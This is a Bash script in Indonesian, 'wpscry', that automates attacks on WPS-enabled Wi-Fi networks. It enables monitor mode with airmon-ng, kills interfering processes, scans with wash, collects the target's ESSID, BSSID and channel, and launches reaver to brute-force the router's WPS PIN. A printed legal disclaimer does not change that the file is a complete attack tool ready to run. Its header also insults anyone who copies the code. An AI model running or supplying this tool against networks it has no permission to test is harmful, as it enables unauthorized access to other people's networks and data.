#!/bin/bash
#--------------
# wpscry - Serang otomatis jaringan Wi-Fi yang menggunakan vitur WPS.
# Dibuat oleh Ropay
#--------------
# Jangan diotak-atik jing, GW cape bikinnya lu kira gampang?
# Tinggal pake apa susahnya sih. ga usah deh lo mau recode 
# segala terus ganti atas nama lo buat pansos. lu kira itu 
# keren?. lo itu sama aja kaya sampah!
#--------------
# Maaf kalo kata-kata GW agak sedikit kasar :)
#--------------

# Fungsi untuk memeriksa apakah skrip dijalankan sebagai root.
function cek_root(){
        if [[ "$EUID" -ne 0 ]]; then
                echo "[-] Skrip ini harus dijalankan sebagai root."
                exit
        fi
}

# Fungsi untuk memeriksa alat yang diperlukan oleh wpscry.
function cek_alat(){

        # List untuk menampung alat yang belum terinstal.
        daftar_alat_belum_terinstal=()

        # List alat yang diperlukan oleh wpscry.
        daftar_alat=(
            "reaver"
            "wash"
            "airmon-ng" 
            "iwconfig"
        )

        # Melakukan iterasi dalam list 'daftar_alat'.
        for cek_alat in "${daftar_alat[@]}"; do
                # Memeriksa apakah alat yang disimpan dalam variabel 'cek_alat' ada di sistem.
                if ! command -v "${cek_alat}" >> /dev/null 2>&1; then 
                    # Menambahkan alat yang tidak ditemukan ke dalam list 'daftar_alat_belum_terinstal'.
                   daftar_alat_belum_terinstal+=("${cek_alat}")
                fi
        done

        # Memeriksa apakah ada elemen dalam list 'daftar_alat_belum_terinstal'.
        if [[ "${#daftar_alat_belum_terinstal[@]}" -ne 0 ]]; then
                echo "[-] Skrip ini tidak dapat dijalankan karena ada alat yang belum terinstal."
                echo ""
                echo "Alat yang belum terinstal:"
                # Melakukan iterasi melalui elemen-elemen dalam daftar 'daftar_alat_belum_terinstal'.
                for alat_belum_terinstal in "${daftar_alat_belum_terinstal[@]}"; do
                        # Menampilkan setiap alat yang belum terinstal.
                        echo "- ${alat_belum_terinstal}"
                done
                exit 1
        fi
    
}

# Fungsi untuk membuat folder 'sesi' untuk menyimpan sesi alat reaver.
function buat_folder(){
        # variabel 'nama_folder' dengan nama folder 'sesi'.
        nama_folder="sesi"
        # Memeriksa apakah folder dengan nama yang disimpan dalam variabel 'nama_folder' tidak ada.
        if [[ ! -d "${nama_folder}" ]]; then
                # Membuat folder dengan nama yang disimpan dalam variabel 'nama_folder'.
                mkdir -p "${nama_folder}"
                # Mengubah izin folder yang disimpan dalam variabel 'nama_folder' menjadi 755.
                chmod 755 "${nama_folder}"
        fi
}

# Fungsi untuk menampilkan peringatan.
function peringatan(){
        # Menampilkan pesan peringatan.
        clear
        echo "PERINGATAN:"
        echo ""
        echo "Skrip ini hanya untuk tujuan pendidikan dan pengujian keamanan. Menggunakan skrip ini untuk mengakses atau"
        echo "menyerang jaringan Wi-Fi tanpa izin eksplisit dari pemiliknya adalah ilegal dan melanggar hukum di banyak"
        echo "negara. Pengguna bertanggung jawab penuh atas segala konsekuensi dari penggunaan skrip ini."
        echo ""
        echo "Dengan menggunakan skrip ini, Anda menyetujui:"
        echo ""
        echo "1. Menggunakan hanya pada jaringan yang Anda miliki atau dengan izin eksplisit dari pemiliknya."
        echo "2. Tidak menggunakan skrip ini untuk tujuan ilegal atau tidak etis."
        echo "3. Mematuhi semua hukum dan peraturan yang berlaku terkait dengan akses dan keamanan jaringan."
        echo "4. Bertanggung jawab penuh atas semua tindakan yang Anda lakukan menggunakan skrip ini, termasuk kerusakan yang"
        echo "   mungkin timbul pada jaringan atau data."
        echo ""
        echo "Jika Anda tidak menyetujui ketentuan ini, harap segera keluar dan tidak menggunakan skrip ini. Penggunaan skrip"
        echo "ini berarti Anda telah membaca, memahami, dan menyetujui semua ketentuan di atas."
        echo ""

        # Menanyakan apakah pengguna ingin melanjutkan atau tidak.
        while true; do
                read -p "Apakah Anda ingin melanjutkan (iya/tidak): " nanya
                # Memeriksa apakah variabel 'nanya' memiliki nilai 'iya'.
                if [[ "${nanya}" == "iya" ]]; then
                        break
                # Memeriksa kondisi tambahan jika kondisi sebelumnya tidak terpenuhi, dengan memeriksa apakah variabel 'nanya' memiliki nilai 'tidak'.
                elif [[ "${nanya}" == "tidak" ]]; then
                        exit 0
                # Menangani kondisi ketika semua pernyataan if dan elif sebelumnya tidak terpenuhi.
                else
                        echo "[-] Masukan tidak valid. Harap masukkan 'iya' atau 'tidak'."
                        continue
                fi
        done
}

# Fungsi untuk menampilkan ucapan selamat datang di wpscry.
function selamat_datang(){
        # Membersihkan layar terminal.
        clear
        # Menampilkan ucapan selamat datang di wpscry.
        echo "Selamat datang di wpscry!"
        echo ""
}

# Fungsi untuk mengatur interface yang ingin digunakan.
function mengatur_interface(){
        # Memasukkan nama interface yang ingin digunakan.
        while true; do
                read -p "Nama interface: " interface
                # Kondisi jika nama interface tidak kosong.
                if [[ ! -z "${interface}" ]]; then
                        # Kondisi jika interface ada.
                        if ip link show | grep -q -w "${interface}"; then
                                echo "[+] Interface ${interface} ditemukan."
                                break
                        # Kondisi jika interface tidak ada.
                        else
                                echo "[-] Interface ${interface} tidak ditemukan."
                                continue
                        fi
                # Kondisi jika nama interface kosong.
                else
                        echo "[-] Nama interface tidak boleh kosong."
                        continue
                fi
        done
}

# Fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur.
function mengaktifkan_mode_monitor(){
        # Kondisi jika interface sudah berada dalam mode monitor.
        if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
                echo "[+] Interface ${interface} sudah dalam mode monitor."
        # Kondisi jika interface belum berada dalam mode monitor.
        else
                echo "[-] Interface ${interface} belum dalam mode monitor."
                echo "[*] Mengaktifkan mode monitor pada interface ${interface}..."
                # Menghentikan proses yang dapat mengganggu mode monitor.
                airmon-ng check kill >> /dev/null 2>&1
                # Mengaktifkan mode monitor.
                airmon-ng start "${interface}" >> /dev/null 2>&1
                # Kondisi jika nama interface berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
                if ip link show | grep -q -w  "${interface}mon"; then
                        interface="${interface}mon"
                        # Kondisi jika nama interface tidak berubah menjadi 'mon' setelah diaktifkan ke mode monitor.
                else
                        interface="${interface}"
                fi

                # Kondisi jika interface ada.
                if ip link show | grep -q -w "${interface}"; then
                        # Kondisi jika interface berhasil diaktifkan ke mode monitor.
                        if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
                                echo "[+] Berhasil mengaktifkan mode monitor pada interface ${interface}."
                        # Kondisi jika interface tidak berhasil diaktifkan ke mode monitor.
                        else
                                echo "[-] Gagal mengaktifkan mode monitor pada interface ${interface}."
                                exit 1
                        fi
                fi
        fi
}

# Fungsi untuk memindai jaringan WPS menggunakan alat wash.
function memindai_jaringan_wps(){
        echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
        echo ""
        # Memindai jaringan WPS.
        wash -i "${interface}"
}

# Fungsi untuk mengatur ESSID yang ingin diserang.
function mengatur_essid(){
        # Memasukkan ESSID yang ingin diserang.
        while true; do
                read -p "ESSID: " essid
                # Kondisi jika ESSID tidak kosong.
                if [[ ! -z "${essid}" ]]; then
                        # Kondisi jika ESSID 'kembali'.
                        if [[ "${essid}" == "kembali" ]]; then
                                # Memanggil fungsi 'mengatur_interface'.
                                mengatur_interface
                                # Memanggil fungsi 'mengaktifkan_mode_monitor'.
                                mengaktifkan_mode_monitor
                                # Memanggil fungsi 'memindai_jaringan_wps'.
                                memindai_jaringan_wps
                        # Kondisi jika ESSID bukan 'kembali'.
                        else
                                echo "[+] ESSID: '${essid}'"
                                break
                        fi    
                # Kondisi jika ESSID kosong.
                else
                        echo "[-] ESSID tidak boleh kosong."
                        continue
                fi
        done
}

# Fungsi untuk mengatur BSSID yang ingin diserang.
function mengatur_bssid(){
        # Memasukkan BSSID yang ingin diserang.
        while true; do
                read -p "BSSID: " bssid
                # Kondisi jika BSSID tidak kosong.
                if [[ ! -z "${bssid}" ]]; then
                        # Kondisi jika BSSID 'kembali'.
                        if [[ "${bssid}" == "kembali" ]]; then
                                # Memanggil fungsi 'mengatur_essid'.
                                mengatur_essid
                        # Kondisi jika BSSID bukan 'kembali'.
                        else
                                # Kondisi jika BSSID merupakan format yang valid.
                                if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
                                        echo "[+] BSSID: '${bssid}'"
                                        break
                                # Kondisi jika BSSID bukan format yang valid.
                                else
                                        echo "[-] BSSID tidak valid."
                                        continue
                                fi
                        fi
                # Kondisi jika BSSID kosong.
                else
                        echo "[-] BSSID tidak boleh kosong."
                        continue
                fi
        done
}

# Fungsi untuk mengatur channel dari Access Point yang ingin diserang.
function mengatur_channel(){
        # Memasukkan channel yang ingin diserang.
        while true; do
                read -p "Channel: " channel
                # Kondisi jika channel tidak kosong.
                if [[ ! -z "${channel}" ]]; then
                        # Kondisi jika channel 'kembali'.
                        if [[ "${channel}" == "kembali" ]]; then
                                mengatur_bssid
                        # Kondisi jika channel bukan 'kembali'.
                        else
                                # Kondisi jika channel merupakan angka.
                                if [[ "${channel}" =~ ^[0-9]+$ ]]; then
                                        echo "[+] Channel: '${channel}'"
                                        break
                                # Kondisi jika channel bukan angka.
                                else
                                        echo "[-] Channel tidak valid."
                                        continue
                                fi
                        fi
                # Kondisi jika channel kosong.
                else
                        echo "[-] Channel tidak boleh kosong."
                        continue
                fi
        done
        read -p "Tekan [Enter] untuk memulai serangan..."
}

# Fungsi untuk melakukan serangan terhadap target yang sudah diatur.
function menjalankan_serangan(){
        waktu=$(date "+%d-%m-%Y_%H:%M:%S")
        sesi="${nama_folder}/${essid}_${waktu}.session"
        reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -v
        #
        # Keterangan:
        #
        # -i   : Menentukan interface jaringan yang akan digunakan (misalnya, wlan0).
        # -c   : Menentukan saluran (channel) jaringan Wi-Fi yang akan diserang.
        # -b   : Menentukan BSSID (alamat MAC) dari router atau access point yang akan diserang.
        # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
        # -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
        # -v   : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
}

# Fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur.
function menonaktifkan_mode_monitor(){
        airmon-ng stop "${interface}" >> /dev/null 2>&1
        systemctl restart NetworkManager
        exit 0
}

# Fungsi utama wpscry.
function wpscry(){
        # Memanggil fungsi cek_root.
        cek_root
        # Memanggil fungsi cek_alat.
        cek_alat
        # Memanggil fungsi buat_folder.
        buat_folder
        # Memanggil fungsi peringatan.
        peringatan
        # Memanggil fungsi mengatur_interface.
        mengatur_interface
        # Memanggil fungsi mengaktifkan_mode_monitor.
        mengaktifkan_mode_monitor
        # Memanggil fungsi memindai_jaringan_wps.
        memindai_jaringan_wps
        # Memanggil fungsi mengatur_essid.
        mengatur_essid
        # Memanggil fungsi mengatur_bssid.
        mengatur_bssid
        # Memanggil fungsi mengatur_channel.
        mengatur_channel
        # Memanggil fungsi menjalankan_serangan.
        menjalankan_serangan
        # Memanggil fungsi menonaktifkan_mode_monitor.
        menonaktifkan_mode_monitor
}

# Memanggil fungsi wpscry.
wpscry
